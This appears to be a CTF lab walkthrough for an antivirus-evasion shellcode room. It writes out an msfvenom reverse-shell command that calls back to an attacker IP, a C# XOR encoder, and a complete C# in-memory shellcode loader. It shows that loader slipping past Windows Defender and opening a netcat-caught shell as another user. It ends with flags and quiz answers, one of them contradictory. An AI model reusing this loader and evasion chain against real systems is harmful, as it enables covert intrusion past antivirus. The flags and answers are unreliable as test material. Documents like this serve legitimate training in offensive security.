# AV Evasion: Shellcode

### Challenge
- Which Antivirus software is running on the VM? `Windows Defender`
- What is the name of the user account to which you have access? <br />
First, on your attack box create a shellcode to execute a reverse shell on windows x64: `msfvenom LHOST=10.11.85.53 LPORT=9001 -p windows/x64/shell_reverse_tcp -f csharp`.<br />
Now compile the encoder program:

        using System;
        using System.Collections.Generic;
        using System.Linq;
        using System.Text;
        using System.Threading.Tasks;
        
        namespace Encrypter
        {
            internal class Program
            {
                private static byte[] xor(byte[] shell, byte[] KeyBytes)
                {
                    for (int i = 0; i < shell.Length; i++)
                    {
                        shell[i] ^= KeyBytes[i % KeyBytes.Length];
                    }
                    return shell;
                }
                static void Main(string[] args)
                {
                    //XOR Key - It has to be the same in the Droppr for Decrypting
                    string key = "THMK3y123!";
        
                    //Convert Key into bytes
                    byte[] keyBytes = Encoding.ASCII.GetBytes(key);
        
                    //Original Shellcode here (csharp format)
                    byte[] buf = new byte[460] {0xfc,0x48,.....0xc0,0xd5};
        
                    //XORing byte by byte and saving into a new array of bytes
                    byte[] encoded = xor(buf, keyBytes);
                    Console.WriteLine(Convert.ToBase64String(encoded));        
                }
            }
        }
Rembember to replace your shellcode inside the variable "buf". Now copy it into the windows machine and compile it using CMD: `csc.exe challenge.c`.<br />
![image](https://github.com/user-attachments/assets/695c3ea7-8523-43d7-a7b9-b03edc78c316)<br />
Now run the encryptor to get the encrypted shellcode. The encryptor first XORs the shellcode with a given key and then encodes it in base64: <br />
![image](https://github.com/user-attachments/assets/0547a87f-6634-407a-9c94-1996274f4c21)<br />
Now we need to create the stage0. So take the following code: 

    using System;
    using System.Net;
    using System.Text;
    using System.Runtime.InteropServices;
    
    public class Program {
      [DllImport("kernel32")]
      private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
    
      [DllImport("kernel32")]
      private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);
    
      [DllImport("kernel32")]
      private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
    
      private static UInt32 MEM_COMMIT = 0x1000;
      private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
      
      private static byte[] xor(byte[] shell, byte[] KeyBytes)
            {
                for (int i = 0; i < shell.Length; i++)
                {
                    shell[i] ^= KeyBytes[i % KeyBytes.Length];
                }
                return shell;
            }
      public static void Main()
      {
    
        string dataBS64 = "qKDPSzN5UbvWEJQsxhsD8mM+uHNAwz9jPM57FAL....pEvWzJg3oE=";
        byte[] data = Convert.FromBase64String(dataBS64);
    
        string key = "THMK3y123!";
        //Convert Key into bytes
        byte[] keyBytes = Encoding.ASCII.GetBytes(key);
    
        byte[] encoded = xor(data, keyBytes);
    
        UInt32 codeAddr = VirtualAlloc(0, (UInt32)encoded.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        Marshal.Copy(encoded, 0, (IntPtr)(codeAddr), encoded.Length);
    
        IntPtr threadHandle = IntPtr.Zero;
        UInt32 threadId = 0;
        IntPtr parameter = IntPtr.Zero;
        threadHandle = CreateThread(0, 0, codeAddr, parameter, 0, ref threadId);
    
        WaitForSingleObject(threadHandle, 0xFFFFFFFF);
    
      }
    }
And put your encrypted shellcode inside the variable `dataBS64`. Now compile it: <br />
![image](https://github.com/user-attachments/assets/152b9391-3949-41a6-8ab6-ad47746e7acf)<br />
If I upload it on the scanner: <br />
![image](https://github.com/user-attachments/assets/140156da-cba0-4bf2-8a5b-580b19885c0b)<br />
It's labled as not malicious!. So now it's time to get the reverse shell. Open a netcat listener (in my case I used port 9001): `nc -lnvp 9001`. And now just execute the payload! <br />
![image](https://github.com/user-attachments/assets/96ee1727-6906-49e3-807f-f8559920ecb1)<br />
It works correctly. Now to get higher access permissions, we upload it in the antivirus check service and wait for it to execute it. <br />
![image](https://github.com/user-attachments/assets/d2ef0892-20da-4c3b-bad4-569a750ab7ec)<br />
We are now the user `av-victim`. 

- Establish a working shell on the victim machine and read the file on the user's desktop. What is the flag?<br />
This is the flag on the Desktop: <br />
![image](https://github.com/user-attachments/assets/b4045c41-e875-4454-a5db-8ee869839daa)<br />
`THM{H3ll0-W1nD0ws-Def3nd3r!}`

### PE Structure
- What is the last 6 digits of the MD5 hash value of the thm-intro2PE.exe file?<br />
![image](https://github.com/user-attachments/assets/bd099143-dbfb-4688-af72-5326f2ee28df)<br />
`530949`
- What is the Magic number value of the thm-intro2PE.exe file (in Hex)?<br />
![image](https://github.com/user-attachments/assets/2d3409ba-544e-4dd2-9a8e-826088963def)<br />
`5A4D`
- What is the Entry Point value of the thm-intro2PE.exe file?<br />
![image](https://github.com/user-attachments/assets/c679d67f-f812-4e09-ad3b-a1299ca55391)<br />
`12E4`
- How many Sections does the thm-intro2PE.exe file have?<br />
![image](https://github.com/user-attachments/assets/54ffa4ff-c7a3-4d41-838f-87a4b452bb3f)<br />
`7`
- A custom section could be used to store extra data. Malware developers use this technique to create a new section that contains their malicious code and hijack the flow of the program to jump and execute the content of the new section. What is the name of the extra section?<br />
`.flag`
- Check the content of the extra section. What is the flag?<br />
Right click on the virtual address and select "Follow RVA 23000": <br />
![image](https://github.com/user-attachments/assets/7a565c43-7732-4925-9b46-db57cc169184)<br />
`THM{PE-N3w-s3ction!}`

### Introduction to Shellcode
- Modify your C program to execute the following shellcode. What is the flag?<br />
On a linux machine take the following code:

      #include <stdio.h>
      
      int main(int argc, char **argv) {
          unsigned char message[] = {
        0xeb, 0x34, 0xb9, 0x00, 0x00, 0x00, 0x00, 0x5e, 0x48, 0x89, 0xf0, 0x80,
        0x34, 0x08, 0x01, 0x48, 0x83, 0xc1, 0x01, 0x48, 0x83, 0xf9, 0x19, 0x75,
        0xf2, 0xb8, 0x01, 0x00, 0x00, 0x00, 0xbf, 0x01, 0x00, 0x00, 0x00, 0xba,
        0x19, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xb8, 0x3c, 0x00, 0x00, 0x00, 0xbf,
        0x00, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xe8, 0xc7, 0xff, 0xff, 0xff, 0x55,
        0x49, 0x4c, 0x7a, 0x78, 0x31, 0x74, 0x73, 0x2c, 0x30, 0x72, 0x36, 0x2c,
        0x34, 0x69, 0x32, 0x30, 0x30, 0x62, 0x31, 0x65, 0x32, 0x7c, 0x0d, 0x0a
      };
          
          (*(void(*)())message)();
          return 0;
      }
And compile it with `gcc -z execstack task4.c -o task4`:<br />
![image](https://github.com/user-attachments/assets/4b46f899-c7b2-459c-bfbb-58fe168c4170)<br />
`THM{y0ur-1s7-5h311c0d3}`

### Staged Payloads
- Do staged payloads deliver the full content of our payload in a single package? (yea/nay) `nay`
- Is the Metasploit payload windows/x64/meterpreter_reverse_https a staged payload? (yea/nay) `nay`
- Is the Metasploit payload windows/x64/meterpreter_reverse_https a staged payload? (yea/nay) `yea`

### Introduction to Encoding and Encryption
- Is encoding shellcode only enough to evade Antivirus software? (yea/nay) `nay`
- Do encoding techniques use a key to encode strings or files? (yea/nay) `nay`
- Do encryption algorithms use a key to encrypt strings or files? (yea/nay) `yea`

### Packers
- Will packers help you obfuscate your malicious code to bypass AV solutions? (yea/nay) `yea`
- Will packers often unpack the original code in-memory before running it? (yea/nay) `yea`
- Are some packers detected as malicious by some AV solutions? (yea/nay) `yea`

### Binders
- Will a binder help with bypassing AV solutions? (yea/nay) `nay`
- Can a binder be used to make a payload appear as a legitimate executable? (yea/nay) `yea`
